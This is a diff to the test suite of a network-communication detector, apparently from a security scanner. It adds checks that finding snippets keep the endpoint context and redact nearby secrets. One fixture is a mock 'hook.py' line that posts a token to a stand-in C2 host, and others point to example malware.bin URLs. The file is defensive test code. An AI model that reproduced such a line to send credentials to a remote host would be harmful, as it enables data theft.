@@ -880,6 +880,7 @@ class TestNetworkCommDetector:
         url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
 
         assert url_finding["url"] == "https://example.com/path/<redacted>/model.bin"
+        assert network_finding["snippet"] == "requests.get https://example.com/path/<redacted>/model.bin"
         assert path_token not in json.dumps([network_finding, url_finding], sort_keys=True)
 
     def test_network_function_snippets_redact_adjacent_credentials(self) -> None:
@@ -913,6 +914,20 @@ class TestNetworkCommDetector:
 
         assert "api_key=x" not in snippet
         assert snippet == "requests.get"
+
+    def test_network_function_snippets_preserve_sanitized_endpoint_context(self) -> None:
+        """Actionable endpoint context should survive without arbitrary surrounding bytes."""
+        detector = NetworkCommDetector()
+        data = b'api_key=BEFORESECRET requests.post("https://c2.example/path?token=QUERYSECRET") AFTERSECRET'
+
+        findings = detector.scan(data, "hook.py")
+        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
+        snippet = str(network_finding["snippet"])
+
+        assert snippet == "requests.post https://c2.example/path"
+        assert "BEFORESECRET" not in snippet
+        assert "QUERYSECRET" not in snippet
+        assert "AFTERSECRET" not in snippet
 
     def test_network_function_snippets_expand_forward_urls_before_redaction(self) -> None:
         """Long URL tails after the function token should be included before URL redaction."""
@@ -964,6 +979,7 @@ class TestNetworkCommDetector:
         url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
 
         assert url_finding["url"] == "https://example.com/download/<redacted>/malware.bin"
+        assert cc_finding["snippet"] == "malware https://example.com/download/<redacted>/malware.bin"
         assert path_token not in json.dumps([cc_finding, url_finding], sort_keys=True)
 
     def test_cc_pattern_snippets_redact_adjacent_credentials(self) -> None:
